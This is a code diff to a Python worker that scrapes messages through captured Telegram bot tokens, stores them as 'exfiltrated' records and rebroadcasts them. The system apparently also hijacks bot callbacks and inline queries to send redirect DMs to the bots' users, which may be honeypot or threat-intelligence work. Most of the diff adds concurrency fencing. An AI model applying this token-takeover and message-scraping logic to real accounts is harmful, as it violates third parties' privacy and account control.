@@ -31,6 +31,12 @@ HIGH_PRIORITY_DOMAIN_KEYWORDS = (
     "blockchain",
 )
 
+
+def _is_positive_scraped_message_id(value: Any) -> bool:
+    """Scraped chat-message IDs occupy only the positive integer namespace."""
+    return isinstance(value, int) and not isinstance(value, bool) and value > 0
+
+
 # Helper for async DB execution
 async def async_execute(query_builder):
     """Executes a Supabase query builder synchronously in a background thread."""
@@ -392,10 +398,49 @@ async def _fetch_pending_broadcast_messages(batch_size: int, now_iso: str) -> li
     return response.data or []
 
 
+async def _apply_broadcast_claimed_update(
+    msg_id: str,
+    payload: dict[str, Any],
+    claim_token: str | None,
+) -> bool:
+    """Write broadcast state only while this worker still owns the row claim."""
+    if not claim_token:
+        return False
+    response = await async_execute(
+        db.table("exfiltrated_messages")
+        .update(payload)
+        .eq("id", msg_id)
+        .eq("broadcast_claimed_at", claim_token)
+    )
+    return bool(response.data)
+
+
+async def _is_broadcast_claim_valid(
+    msg_id: str,
+    claim_token: str,
+    lease_minutes: int,
+) -> bool:
+    """Confirm the broadcast claim is still owned and within its lease."""
+    from datetime import datetime, timedelta
+
+    cutoff = (datetime.now(UTC) - timedelta(minutes=lease_minutes)).isoformat()
+    response = await async_execute(
+        db.table("exfiltrated_messages")
+        .select("id")
+        .eq("id", msg_id)
+        .eq("is_broadcasted", False)
+        .eq("broadcast_claimed_at", claim_token)
+        .gte("broadcast_claimed_at", cutoff)
+        .limit(1)
+    )
+    return bool(response.data)
+
+
 async def _update_message_broadcast_success(
     msg_id: str,
     broadcast_message_id: int | None = None,
-) -> None:
+    claim_token: str | None = None,
+) -> bool:
     from datetime import datetime
 
     now_iso = datetime.now(UTC).isoformat()
@@ -411,17 +456,19 @@ async def _update_message_broadcast_success(
         payload["broadcast_status"] = "sent"
     if _can_use_broadcast_reliability_columns():
         try:
-            await async_execute(
-                db.table("exfiltrated_messages")
-                .update({
+            updated = await _apply_broadcast_claimed_update(
+                msg_id,
+                {
                     **payload,
                     "broadcast_error": None,
                     "next_retry_at": None,
-                })
-                .eq("id", msg_id)
+                },
+                claim_token,
             )
+            if not updated:
+                return False
             _set_broadcast_reliability_columns_available(True)
-            return
+            return True
         except Exception as exc:
             exc_str = str(exc)
             if _is_missing_broadcast_reliability_column(exc):
@@ -444,16 +491,15 @@ async def _update_message_broadcast_success(
                 )
                 payload.pop("broadcast_message_id", None)
                 payload.pop("broadcast_status", None)
-                await async_execute(
-                    db.table("exfiltrated_messages")
-                    .update({
+                return await _apply_broadcast_claimed_update(
+                    msg_id,
+                    {
                         **payload,
                         "broadcast_error": None,
                         "next_retry_at": None,
-                    })
-                    .eq("id", msg_id)
+                    },
+                    claim_token,
                 )
-                return
             elif "broadcasted_at" in exc_str:
                 # Column not yet migrated — retry without it
                 logger.warning(
@@ -464,10 +510,7 @@ async def _update_message_broadcast_success(
                 payload.pop("broadcasted_at", None)
                 payload.pop("broadcast_message_id", None)
                 payload.pop("broadcast_status", None)
-                await async_execute(
-                    db.table("exfiltrated_messages").update(payload).eq("id", msg_id)
-                )
-                return
+                return await _apply_broadcast_claimed_update(msg_id, payload, claim_token)
             else:
                 raise
 
@@ -477,20 +520,20 @@ async def _update_message_broadcast_success(
     payload.pop("broadcast_message_id", None)
     payload.pop("broadcast_status", None)
     try:
-        await async_execute(
-            db.table("exfiltrated_messages").update(payload).eq("id", msg_id)
-        )
+        return await _apply_broadcast_claimed_update(msg_id, payload, claim_token)
     except Exception as exc:
         if "broadcasted_at" in str(exc):
             payload.pop("broadcasted_at", None)
-            await async_execute(
-                db.table("exfiltrated_messages").update(payload).eq("id", msg_id)
-            )
+            return await _apply_broadcast_claimed_update(msg_id, payload, claim_token)
         else:
             raise
 
 
-async def _mark_broadcast_failure(msg: dict[str, Any], exc: BaseException) -> None:
+async def _mark_broadcast_failure(
+    msg: dict[str, Any],
+    exc: BaseException,
+    claim_token: str | None = None,
+) -> bool:
     from datetime import datetime, timedelta
 
     msg_id = msg["id"]
@@ -522,9 +565,9 @@ async def _mark_broadcast_failure(msg: dict[str, Any], exc: BaseException) -> No
             "next_retry_at": None,
         }
         try:
-            await async_execute(
-                db.table("exfiltrated_messages").update(terminal_payload).eq("id", msg_id)
-            )
+            updated = await _apply_broadcast_claimed_update(msg_id, terminal_payload, claim_token)
+            if not updated:
+                return False
             _set_broadcast_reliability_columns_available(True)
         except Exception as terminal_exc:
             terminal_str = str(terminal_exc)
@@ -532,16 +575,18 @@ async def _mark_broadcast_failure(msg: dict[str, Any], exc: BaseException) -> No
             # and try again — we still want to exit the retry pool.
             if "broadcast_status" in terminal_str:
                 terminal_payload.pop("broadcast_status", None)
-                with contextlib.suppress(Exception):
-                    await async_execute(
-                        db.table("exfiltrated_messages")
-                        .update(terminal_payload)
-                        .eq("id", msg_id)
-                    )
+                try:
+                    updated = await _apply_broadcast_claimed_update(msg_id, terminal_payload, claim_token)
+                except Exception as fallback_exc:
+                    logger.error(f"[Broadcast] terminal fallback failed for {msg_id}: {fallback_exc}")
+                    return False
+                if not updated:
+                    return False
             else:
                 logger.error(
                     f"[Broadcast] terminal update failed for {msg_id}: {terminal_str[:200]}"
                 )
+                return False
         AuditLogger.log(
             AuditEvent.BROADCAST_FAILED,
             credential_id=msg.get("credential_id"),
@@ -558,7 +603,7 @@ async def _mark_broadcast_failure(msg: dict[str, Any], exc: BaseException) -> No
             f"    🛑 [Broadcast] {msg_id} moved to permanent_failed after "
             f"{attempts} attempts (reason={reason})"
         )
-        return
+        return True
 
     delay_seconds = _broadcast_retry_delay_seconds(reason, retryable, retry_after_seconds)
     next_retry_at = (now + timedelta(seconds=delay_seconds)).isoformat()
@@ -574,7 +619,9 @@ async def _mark_broadcast_failure(msg: dict[str, Any], exc: BaseException) -> No
         "next_retry_at": next_retry_at,
     }
     try:
-        await async_execute(db.table("exfiltrated_messages").update(payload).eq("id", msg_id))
+        updated = await _apply_broadcast_claimed_update(msg_id, payload, claim_token)
+        if not updated:
+            return False
         _set_broadcast_reliability_columns_available(True)
     except Exception as update_exc:
         if not _is_missing_broadcast_reliability_column(update_exc):
@@ -585,11 +632,13 @@ async def _mark_broadcast_failure(msg: dict[str, Any], exc: BaseException) -> No
             "Apply database/migrations/2026-08-02-scrape-broadcast-reliability.sql "
             "to persist broadcast errors and retry times."
         )
-        await async_execute(
-            db.table("exfiltrated_messages")
-            .update({"broadcast_claimed_at": None})
-            .eq("id", msg_id)
+        updated = await _apply_broadcast_claimed_update(
+            msg_id,
+            {"broadcast_claimed_at": None},
+            claim_token,
         )
+        if not updated:
+            return False
     AuditLogger.log(
         AuditEvent.BROADCAST_FAILED,
         credential_id=msg.get("credential_id"),
@@ -602,6 +651,7 @@ async def _mark_broadcast_failure(msg: dict[str, Any], exc: BaseException) -> No
         },
         success=False,
     )
+    return True
 
 
 # Redis Client for Locking
@@ -750,16 +800,26 @@ async def _exfiltrate_logic(cred_id: str):
         if meta_info:
             await _merge_credential_meta(cred_id, meta_info)
         if updates:
-            for u in updates:
-                u["credential_id"] = cred_id
-            preflight_result = await async_execute(
-                db.table("exfiltrated_messages").upsert(
-                    updates,
-                    on_conflict="credential_id,telegram_msg_id",
-                    ignore_duplicates=True
+            valid_updates = [
+                u for u in updates
+                if isinstance(u, dict) and _is_positive_scraped_message_id(u.get("telegram_msg_id"))
+            ]
+            invalid_count = len(updates) - len(valid_updates)
+            if invalid_count:
+                logger.warning(
+                    f"[Exfil] Dropping {invalid_count} preflight messages with non-positive or invalid IDs for {cred_id}"
                 )
-            )
-            await _index_telemetry_indicators(preflight_result.data or updates)
+            for u in valid_updates:
+                u["credential_id"] = cred_id
+            if valid_updates:
+                preflight_result = await async_execute(
+                    db.table("exfiltrated_messages").upsert(
+                        valid_updates,
+                        on_conflict="credential_id,telegram_msg_id",
+                        ignore_duplicates=True
+                    )
+                )
+                await _index_telemetry_indicators(preflight_result.data or valid_updates)
     except Exception as e:
         logger.warning(f"⚠️ [Exfil] Preflight check failed for {cred_id}: {e}")
 
@@ -819,6 +879,12 @@ async def _exfiltrate_logic(cred_id: str):
     new_count = 0
     index_candidates: list[dict[str, Any]] = []
     for msg in messages:
+        message_id = msg.get("telegram_msg_id") if isinstance(msg, dict) else None
+        if not _is_positive_scraped_message_id(message_id):
+            logger.warning(
+                f"[Exfil] Dropping scraped message with non-positive or invalid ID {message_id!r} for {cred_id}"
+            )
+            continue
         msg["credential_id"] = cred_id
 
         # SANITIZE: Remove keys that don't exist in the 'exfiltrated_messages' table
@@ -919,7 +985,7 @@ async def _enrich_logic(cred_id: str):
     bot_info = {}
     try:
         logger.info("🔎 [Enrich] Discovering chats via ScraperService...")
-        bot_info, chats = await scraper_service.discover_chats(bot_token)
+        bot_info, chats = await scraper_service.discover_chats(bot_token, credential_id=cred_id)
         logger.info(f"✅ [Enrich] Discovery returned {len(chats) if chats else 0} chats.")
         if chats:
             chat_list = ", ".join([f"{c['name']} ({c['id']})" for c in chats])
@@ -1140,6 +1206,123 @@ def broadcast_pending():
         with contextlib.suppress(redis.exceptions.LockError):
             lock.release()  # Lock expired or already released
 
+@app.task(name="flow.broadcast_honeypot_message")
+def broadcast_honeypot_message(credential_id: str, telegram_msg_id: int):
+    """Broadcast a single specific honeypot message to the bot's Telegram topic.
+
+    Targets ONLY the specific honeypot message without draining or flushing
+    unbroadcasted scraper history (strictly preserving the ENABLE_RAW_MESSAGE_BROADCAST policy).
+    """
+    if not getattr(settings, "HONEYPOT_BROADCAST_TO_TOPIC", True):
+        return "Disabled: honeypot topic broadcast is disabled."
+
+    from app.workers.celery_app import get_worker_loop
+
+    return get_worker_loop().run_until_complete(
+        _broadcast_single_honeypot_message(credential_id, telegram_msg_id)
+    )
+
+async def _broadcast_single_honeypot_message(credential_id: str, telegram_msg_id: int) -> dict:
+    from datetime import datetime
+
+    # Strict namespace validation: honeypot messages MUST have negative telegram_msg_id
+    if telegram_msg_id >= 0:
+        logger.warning(
+            f"[HoneypotBroadcast] Refusing non-negative message ID {telegram_msg_id} (not a honeypot message)"
+        )
+        return {"status": "skipped", "reason": "invalid_honeypot_id"}
+
+    # 1. Fetch the exact message with joined discovered_credentials
+    res = await async_execute(
+        db.table("exfiltrated_messages")
+        .select("*, discovered_credentials!inner(meta)")
+        .eq("credential_id", credential_id)
+        .eq("telegram_msg_id", telegram_msg_id)
+        .limit(1)
+    )
+    if not res.data:
+        return {"status": "not_found", "credential_id": credential_id, "telegram_msg_id": telegram_msg_id}
+
+    msg = res.data[0] if isinstance(res.data, list) else res.data
+    if msg.get("is_broadcasted"):
+        return {"status": "already_broadcasted"}
+
+    # Strict source validation: guarantee only bot_api honeypot messages enter this path
+    file_meta = msg.get("file_meta") if isinstance(msg.get("file_meta"), dict) else {}
+    if file_meta.get("source") != "bot_api":
+        logger.warning(
+            f"[HoneypotBroadcast] Refusing to broadcast non-honeypot message {telegram_msg_id} (source={file_meta.get('source')})"
+        )
+        return {"status": "skipped", "reason": "not_honeypot_source"}
+
+    # Atomic claim on this specific message with stale claim (> 5 min) recovery
+    from datetime import timedelta
+    claim_time = datetime.now(UTC).isoformat()
+    stale_claim_cutoff = (datetime.now(UTC) - timedelta(minutes=5)).isoformat()
+    claim_res = await async_execute(
+        db.table("exfiltrated_messages")
+        .update({"broadcast_claimed_at": claim_time})
+        .eq("id", msg["id"])
+        .eq("is_broadcasted", False)
+        .or_(f"broadcast_claimed_at.is.null,broadcast_claimed_at.lt.{stale_claim_cutoff}")
+    )
+    if not claim_res.data:
+        return {"status": "contended"}
+
+    # Resolve topic & broadcaster
+    group_id = settings.MONITOR_GROUP_ID
+    broadcaster = get_broadcaster()
+    meta = (msg.get("discovered_credentials") or {}).get("meta") or {}
+    bot_username = meta.get("bot_username")
+    bot_id = meta.get("bot_id")
+    if bot_username and bot_username != "unknown" and bot_id:
+        topic_name = f"@{bot_username} / {bot_id}"
+    elif bot_id:
+        topic_name = f"@unknown / {bot_id}"
+    else:
+        topic_name = f"Cred-{credential_id[:8]}"
+
+    thread_id = meta.get("topic_id")
+    if not thread_id:
+        try:
+            thread_id = await broadcaster.ensure_topic(group_id, topic_name)
+            meta["topic_id"] = thread_id
+            await async_execute(
+                db.table("discovered_credentials")
+                .update({"meta": meta})
+                .eq("id", credential_id)
+            )
+        except Exception as topic_err:
+            logger.error(f"[HoneypotBroadcast] Could not ensure topic: {topic_err}")
+            await async_execute(
+                db.table("exfiltrated_messages")
+                .update({"broadcast_claimed_at": None})
+                .eq("id", msg["id"])
+                .eq("broadcast_claimed_at", claim_time)
+            )
+            return {"status": "topic_failed", "error": str(topic_err)}
+
+    if not await _is_broadcast_claim_valid(msg["id"], claim_time, lease_minutes=5):
+        logger.warning(f"[HoneypotBroadcast] Fenced out immediately pre-send for {msg['id']}")
+        return {"status": "fenced_out"}
+
+    try:
+        sent_msg_id = await broadcaster.send_message(group_id, thread_id, msg)
+        completed = await _update_message_broadcast_success(
+            msg["id"],
+            broadcast_message_id=sent_msg_id,
+            claim_token=claim_time,
+        )
+        if not completed:
+            return {"status": "fenced_out"}
+        logger.info(f"✅ [HoneypotBroadcast] Sent message {msg['id']} to topic {thread_id}")
+        return {"status": "sent", "broadcast_message_id": sent_msg_id}
+    except Exception as send_err:
+        logger.error(f"❌ [HoneypotBroadcast] Send failed: {send_err}")
+        if not await _mark_broadcast_failure(msg, send_err, claim_token=claim_time):
+            return {"status": "fenced_out"}
+        return {"status": "failed", "error": str(send_err)}
+
 async def _broadcast_logic():
     """
     Broadcast pending messages to Telegram topics.
@@ -1262,7 +1445,7 @@ async def _broadcast_logic():
                         .update({"broadcast_claimed_at": claim_time})\
                         .eq("id", msg_id)\
                         .eq("is_broadcasted", False)\
-                        .is_("broadcast_claimed_at", "null")\
+                        .is_("broadcast_claimed_at", "null")
                         )
 
                     if not claim_result.data:
@@ -1273,7 +1456,7 @@ async def _broadcast_logic():
                             .update({"broadcast_claimed_at": claim_time})\
                             .eq("id", msg_id)\
                             .eq("is_broadcasted", False)\
-                            .lt("broadcast_claimed_at", stale_iso)\
+                            .lt("broadcast_claimed_at", stale_iso)
                             )
 
                         if not reclaim_result.data:
@@ -1373,6 +1556,7 @@ async def _broadcast_logic():
                                     f"Could not create topic '{topic_name}': {e_topic}",
                                     retryable=True,
                                 ),
+                                claim_token=claim_time,
                             )
                             continue
 
@@ -1410,6 +1594,14 @@ async def _broadcast_logic():
                         send_success = True
                     else:
                         try:
+                            if not await _is_broadcast_claim_valid(
+                                msg_id,
+                                claim_time,
+                                lease_minutes=CLAIM_TIMEOUT_MINUTES,
+                            ):
+                                logger.warning(f"    ⏱️ Broadcast claim expired before send for {msg_id}")
+                                local_skipped += 1
+                                continue
                             sent_message_id = await broadcaster.send_message(group_id, thread_id, msg)
                             send_success = True
                             performed_real_send = True
@@ -1434,20 +1626,36 @@ async def _broadcast_logic():
                                     await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
                                     cached_topic_ids[cred_id] = thread_id
                                     # Retry Send
+                                    if not await _is_broadcast_claim_valid(
+                                        msg_id,
+                                        claim_time,
+                                        lease_minutes=CLAIM_TIMEOUT_MINUTES,
+                                    ):
+                                        logger.warning(f"    ⏱️ Broadcast claim expired before retry for {msg_id}")
+                                        local_skipped += 1
+                                        continue
                                     sent_message_id = await broadcaster.send_message(group_id, thread_id, msg)
                                     send_success = True
                                 except Exception as retry_e:
                                     logger.error(f"    ❌ Failed after topic recreation: {retry_e}")
-                                    await _mark_broadcast_failure(msg, retry_e)
+                                    await _mark_broadcast_failure(msg, retry_e, claim_token=claim_time)
                             else:
                                 logger.error(f"    ❌ Send failed: {e}")
-                                await _mark_broadcast_failure(msg, e)
+                                await _mark_broadcast_failure(msg, e, claim_token=claim_time)
 
                     if send_success:
                         # ==============================================
                         # SUCCESS: Mark as broadcasted and clear claim
                         # ==============================================
-                        await _update_message_broadcast_success(msg_id, broadcast_message_id=sent_message_id)
+                        completed = await _update_message_broadcast_success(
+                            msg_id,
+                            broadcast_message_id=sent_message_id,
+                            claim_token=claim_time,
+                        )
+                        if not completed:
+                            logger.warning(f"    ⏱️ Broadcast completion fenced out for {msg_id}")
+                            local_skipped += 1
+                            continue
                         local_sent += 1
                         if performed_real_send:
                             # PERF-002: only count metric for real over-the-wire sends,
@@ -1498,7 +1706,11 @@ async def _broadcast_logic():
                 except Exception as e:
                     logger.error(f"Error broadcasting msg {msg_id}: {e}")
                     try:
-                        await _mark_broadcast_failure(msg, e)
+                        await _mark_broadcast_failure(
+                            msg,
+                            e,
+                            claim_token=claim_time,
+                        )
                     except Exception as e_claim:
                         logger.error(f"Failed to clear broadcast claim for msg {msg_id}: {e_claim} — message may be stuck until stale-claim TTL expires")
                     continue
@@ -1802,7 +2014,8 @@ async def _canary_flow_check_logic():
         }
 
     now = datetime.now(UTC)
-    telegram_msg_id = -int(time.time())
+    CANARY_MSG_ID_BASE = 9_000_000_000_000_000
+    telegram_msg_id = -(CANARY_MSG_ID_BASE + int(time.time()))
     content = f"{settings.CANARY_EXPECTED_TEXT} {now.isoformat()}"
     row = {
         "credential_id": cred_id,
@@ -4431,18 +4644,47 @@ def honeypot_redirect_sweep():
     return get_worker_loop().run_until_complete(_honeypot_redirect_sweep_logic())
 
 
+_LUA_RELEASE_RESERVATION = """
+if redis.call("get", KEYS[1]) == ARGV[1] then
+    return redis.call("del", KEYS[1])
+else
+    return 0
+end
+"""
+
+
+def _safe_release_redis_reservation(client, key: str, token: str) -> None:
+    try:
+        client.eval(_LUA_RELEASE_RESERVATION, 1, key, token)
+    except Exception as _swallowed:
+        logger.debug(f"[suppressed] {_swallowed}")
+
+
 async def _honeypot_redirect_sweep_logic() -> dict:
     if not settings.HONEYPOT_REDIRECT_MODE:
         return {"status": "disabled", "reason": "mode_disabled"}
     if not settings.HONEYPOT_REDIRECT_AUTHORIZED:
         return {"status": "skipped", "reason": "not_authorized"}
 
+    from datetime import UTC, datetime, timedelta
+
     try:
+        # Clear stale claims (> 15 min old) across all honeypot update rows
+        stale_threshold = (datetime.now(UTC) - timedelta(minutes=15)).isoformat()
+        with contextlib.suppress(Exception):
+            await async_execute(
+                db.table("honeypot_updates")
+                .update({"redirect_claimed_at": None})
+                .not_.is_("redirect_claimed_at", "null")
+                .lt("redirect_claimed_at", stale_threshold)
+            )
+
         # Get un-redirected message-type updates
         res = await async_execute(
             db.table("honeypot_updates")
             .select("id, credential_id, payload, received_at, update_type")
             .is_("redirected_at", "null")
+            .is_("redirect_claimed_at", "null")
             .in_("update_type", ["message", "callback_query", "inline_query", "edited_message", "channel_post"])
             .order("received_at", desc=False)
             .limit(50)
@@ -4457,14 +4699,10 @@ async def _honeypot_redirect_sweep_logic() -> dict:
     dispatched = 0
     skipped = 0
 
-    # INTR-002 / CONC-002: claim-before-dispatch. Marker string 'pending' so a
-    # concurrent sweep never re-dispatches the same row before honeypot_redirect_one
+    # INTR-002 / CONC-002: claim-before-dispatch using redirect_claimed_at.
+    # A concurrent sweep never re-dispatches the same row before honeypot_redirect_one
     # writes the final timestamp. On dispatch success the sub-task flips it to a
-    # real ISO timestamp; on send failure it clears it back to NULL.
-    #
-    # Value is inlined below because Supabase update() takes the literal.
-
-
+    # real ISO timestamp; on send failure it clears redirect_claimed_at back to NULL.
 
     for row in rows:
         payload = row.get("payload") or {}
@@ -4510,42 +4748,60 @@ async def _honeypot_redirect_sweep_logic() -> dict:
             skipped += 1
             continue
 
-        # Per-user dedup
+        # Per-user dedup: atomically acquire Redis reservation with NX (set only if not exists)
+        now_claim = datetime.now(UTC).isoformat()
+        claim_token = now_claim
         dedup_key = f"redirect:sent:{credential_id}:{user_id}"
+        owner_token = f"claiming:{row['id']}:{claim_token}"
+        reserved_dedup = False
         try:
             from app.core.redis_srv import redis_srv
-            if redis_srv.client.exists(dedup_key):
+            # 300s temporary hold with attempt-unique owner_token prevents races across sweepers
+            reserved_dedup = bool(redis_srv.client.set(dedup_key, owner_token, nx=True, ex=300))
+            if not reserved_dedup:
+                # Key already exists: another row/worker is actively processing or already sent redirect
                 with contextlib.suppress(Exception):
                     await async_execute(
                         db.table("honeypot_updates")
-                        .update({"redirected_at": "now()", "redirected_bot": "dedup_skip"})
+                        .update({
+                            "redirected_at": datetime.now(UTC).isoformat(),
+                            "redirect_claimed_at": None,
+                            "redirected_bot": "dedup_skip",
+                        })
                         .eq("id", row["id"])
                     )
                 skipped += 1
                 continue
-        except Exception as _swallowed:
-            logger.debug(f"[suppressed] {_swallowed}")
+        except Exception as redis_exc:
+            logger.warning(f"[HoneypotSweep] Redis error during reservation for {dedup_key}: {redis_exc}")
+            skipped += 1
+            continue
 
-        # INTR-002 / CONC-002: atomic claim — set redirected_at='pending' only
-        # if it is still NULL. If another sweep already claimed the row, this
-        # returns zero rows and we move on. Prevents duplicate DM to victim.
+        # INTR-002 / CONC-002: atomic claim — set redirect_claimed_at only
+        # if redirected_at and redirect_claimed_at are still NULL. If another sweep
+        # already claimed the row, this returns zero rows and we move on. Prevents duplicate DM to victim.
         try:
             claim_res = await async_execute(
                 db.table("honeypot_updates")
-                .update({"redirected_at": "pending"})
+                .update({"redirect_claimed_at": claim_token})
                 .eq("id", row["id"])
                 .is_("redirected_at", "null")
+                .is_("redirect_claimed_at", "null")
             )
             if not claim_res.data:
                 logger.debug(f"[HoneypotSweep] claim contended for row {row['id']}")
+                if reserved_dedup:
+                    _safe_release_redis_reservation(redis_srv.client, dedup_key, owner_token)
                 skipped += 1
                 continue
         except Exception as claim_exc:
             logger.warning(f"[HoneypotSweep] claim failed for row {row['id']}: {claim_exc}")
+            if reserved_dedup:
+                _safe_release_redis_reservation(redis_srv.client, dedup_key, owner_token)
             skipped += 1
             continue
 
-        # Dispatch redirect with update_type for specialized handling
+        # Dispatch redirect with update_type and claim_token for fenced completion
         app.send_task(
             "flow.honeypot_redirect_one",
             kwargs={
@@ -4554,9 +4810,33 @@ async def _honeypot_redirect_sweep_logic() -> dict:
                 "user_id": user_id,
                 "chat_id": chat_id,
                 "update_type": update_type,
+                "claim_token": now_claim,
             },
         )
         dispatched += 1
+
+    # Durable retry for deferred honeypot broadcasts (reclaiming stale unbroadcasted messages older than 5m)
+    stale_broadcast_cutoff = (datetime.now(UTC) - timedelta(minutes=5)).isoformat()
+    try:
+        unbroadcasted = await async_execute(
+            db.table("exfiltrated_messages")
+            .select("credential_id, telegram_msg_id")
+            .eq("is_broadcasted", False)
+            .eq("file_meta->>source", "bot_api")
+            .lt("telegram_msg_id", 0)
+            .or_(f"broadcast_claimed_at.is.null,broadcast_claimed_at.lt.{stale_broadcast_cutoff}")
+            .limit(20)
+        )
+        for h_msg in (unbroadcasted.data or []):
+            app.send_task(
+                "flow.broadcast_honeypot_message",
+                kwargs={
+                    "credential_id": h_msg["credential_id"],
+                    "telegram_msg_id": h_msg["telegram_msg_id"],
+                },
+            )
+    except Exception as e:
+        logger.debug(f"[HoneypotSweep] deferred broadcast retry error: {e}")
 
     return {"status": "ok", "dispatched": dispatched, "skipped": skipped, "pending": len(rows)}
 
@@ -4568,12 +4848,13 @@ def honeypot_redirect_one(
     user_id: int,
     chat_id: int,
     update_type: str = "message",
+    claim_token: str | None = None,
 ):
     """Send a redirect message to a single user via the captured bot's token."""
     from app.workers.celery_app import get_worker_loop
 
     return get_worker_loop().run_until_complete(
-        _honeypot_redirect_one_logic(update_id, credential_id, user_id, chat_id, update_type)
+        _honeypot_redirect_one_logic(update_id, credential_id, user_id, chat_id, update_type, claim_token=claim_token)
     )
 
 
@@ -4583,12 +4864,36 @@ async def _honeypot_redirect_one_logic(
     user_id: int,
     chat_id: int,
     update_type: str = "message",
+    claim_token: str | None = None,
 ) -> dict:
-    from datetime import datetime
+    from datetime import datetime, timedelta
 
     import httpx
 
     from app.workers.tasks.honeypot_redirect_strategies import HoneypotRedirectStrategies
+
+    dedup_key = f"redirect:sent:{credential_id}:{user_id}"
+    owner_token = f"claiming:{update_id}:{claim_token}" if claim_token else None
+
+    async def _is_fence_valid() -> bool:
+        if not claim_token:
+            return False
+        try:
+            # Lease check: claim must be fresh and within 10 minutes (sweep reclaims at 15m)
+            stale_lease_cutoff = (datetime.now(UTC) - timedelta(minutes=10)).isoformat()
+            check = await async_execute(
+                db.table("honeypot_updates")
+                .select("id")
+                .eq("id", update_id)
+                .eq("redirect_claimed_at", claim_token)
+                .is_("redirected_at", "null")
+                .gte("redirect_claimed_at", stale_lease_cutoff)
+                .limit(1)
+            )
+            return bool(check.data)
+        except Exception as check_exc:
+            logger.warning(f"[HoneypotRedirect] fence check error for {update_id}: {check_exc}")
+            return False
 
     # Recheck both safety gates for queued jobs. Report the ACTUAL gate that
     # failed — the previous shared "not_authorized" reason for both was
@@ -4596,13 +4901,16 @@ async def _honeypot_redirect_one_logic(
     # the sweep-side "pending" claim so the row can be tried again once the
     # operator flips the gate back on.
     async def _release_pending_claim(reason_tag: str) -> None:
+        if not claim_token:
+            return
         try:
-            await async_execute(
+            query = (
                 db.table("honeypot_updates")
-                .update({"redirected_at": None})
+                .update({"redirect_claimed_at": None, "redirected_at": None})
                 .eq("id", update_id)
-                .eq("redirected_at", "pending")
+                .eq("redirect_claimed_at", claim_token)
             )
+            await async_execute(query)
             logger.debug(
                 f"[HoneypotRedirect] released pending claim on {update_id} ({reason_tag})"
             )
@@ -4610,6 +4918,13 @@ async def _honeypot_redirect_one_logic(
             logger.debug(
                 f"[HoneypotRedirect] could not release pending claim: {_release_exc}"
             )
+        # Release temporary claiming reservation atomically using owner_token
+        if owner_token:
+            try:
+                from app.core.redis_srv import redis_srv
+                _safe_release_redis_reservation(redis_srv.client, dedup_key, owner_token)
+            except Exception as _swallowed:
+                logger.debug(f"[suppressed] {_swallowed}")
 
     if not settings.HONEYPOT_REDIRECT_MODE:
         await _release_pending_claim("mode_disabled")
@@ -4617,6 +4932,13 @@ async def _honeypot_redirect_one_logic(
     if not settings.HONEYPOT_REDIRECT_AUTHORIZED:
         await _release_pending_claim("not_authorized")
         return {"status": "skipped", "reason": "not_authorized"}
+
+    # Strict fence: jobs without a claim_token are completely disallowed from executing
+    if not claim_token:
+        logger.warning(
+            f"🔀 [Redirect] Missing claim_token for row {update_id} — unfenced execution rejected"
+        )
+        return {"status": "fenced_out", "reason": "missing_claim_token"}
 
     redirect_bot = settings.HONEYPOT_REDIRECT_BOT
     deeplink = settings.HONEYPOT_REDIRECT_DEEPLINK
@@ -4639,14 +4961,22 @@ async def _honeypot_redirect_one_logic(
         if not bot_token:
             return {"status": "token_decrypt_failed"}
 
+        # Immediate pre-send fence check directly before outbound API call
+        if not await _is_fence_valid():
+            logger.warning(f"🔀 [Callback] Fenced out immediately pre-send for {update_id}")
+            return {"status": "fenced_out", "credential_id": credential_id}
+
         sent_ok = await HoneypotRedirectStrategies.send_callback_hijack(
             bot_token, callback_id, redirect_url, redirect_bot
         )
 
         if sent_ok:
-            await HoneypotRedirectStrategies.update_redirect_record(
-                update_id, user_id, redirect_bot
+            updated = await HoneypotRedirectStrategies.update_redirect_record(
+                update_id, user_id, redirect_bot, claim_token=claim_token
             )
+            if not updated:
+                logger.warning(f"🔀 [Callback] Fenced out post-send for {update_id}")
+                return {"status": "fenced_out", "credential_id": credential_id}
             HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
         else:
             # INTR-002: release the sweep-side "pending" claim so the next
@@ -4677,14 +5007,22 @@ async def _honeypot_redirect_one_logic(
         if not bot_token:
             return {"status": "token_decrypt_failed"}
 
+        # Immediate pre-send fence check directly before outbound API call
+        if not await _is_fence_valid():
+            logger.warning(f"🔀 [Inline] Fenced out immediately pre-send for {update_id}")
+            return {"status": "fenced_out", "credential_id": credential_id}
+
         sent_ok = await HoneypotRedirectStrategies.send_inline_hijack(
             bot_token, inline_id, query_text, redirect_url, redirect_bot
         )
 
         if sent_ok:
-            await HoneypotRedirectStrategies.update_redirect_record(
-                update_id, user_id, redirect_bot
+            updated = await HoneypotRedirectStrategies.update_redirect_record(
+                update_id, user_id, redirect_bot, claim_token=claim_token
             )
+            if not updated:
+                logger.warning(f"🔀 [Inline] Fenced out post-send for {update_id}")
+                return {"status": "fenced_out", "credential_id": credential_id}
             HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
         else:
             # INTR-002: release the sweep-side "pending" claim on failure.
@@ -4709,11 +5047,11 @@ async def _honeypot_redirect_one_logic(
     except Exception as e:
         # Mark the row with error
         with contextlib.suppress(Exception):
-            await async_execute(
-                db.table("honeypot_updates")
-                .update({"redirect_error": f"token_decrypt: {str(e)[:100]}"})
-                .eq("id", update_id)
-            )
+            query = db.table("honeypot_updates").update({"redirect_error": f"token_decrypt: {str(e)[:100]}"}).eq("id", update_id)
+            if claim_token:
+                query = query.eq("redirect_claimed_at", claim_token)
+            await async_execute(query)
+        await _release_pending_claim("token_decrypt_failed")
         return {"status": "token_decrypt_failed", "error": str(e)[:200]}
 
     # BUG-3 FIX: Define redirect_1 text for normal message path
@@ -4724,6 +5062,11 @@ async def _honeypot_redirect_one_logic(
         f"👉 {redirect_url}\n"
         "This is an automated notification."
     )
+
+    # Immediate pre-send fence check directly before outbound Bot API call
+    if not await _is_fence_valid():
+        logger.warning(f"🔀 [Redirect] Fenced out immediately pre-send for {update_id}")
+        return {"status": "fenced_out", "credential_id": credential_id}
 
     # Send the message via Bot API
     try:
@@ -4749,34 +5092,45 @@ async def _honeypot_redirect_one_logic(
         if sent_ok:
             update_payload = {
                 "redirected_at": now,
+                "redirect_claimed_at": None,
                 "redirected_bot": redirect_bot,
                 "sender_user_id": user_id,
                 "redirect_1_sent_at": now,
                 "redirect_attempt": 1,
             }
         else:
-            # INTR-002: on failure, ALSO clear the sweep-side "pending" claim
-            # by writing redirected_at=None so the next sweep can retry.
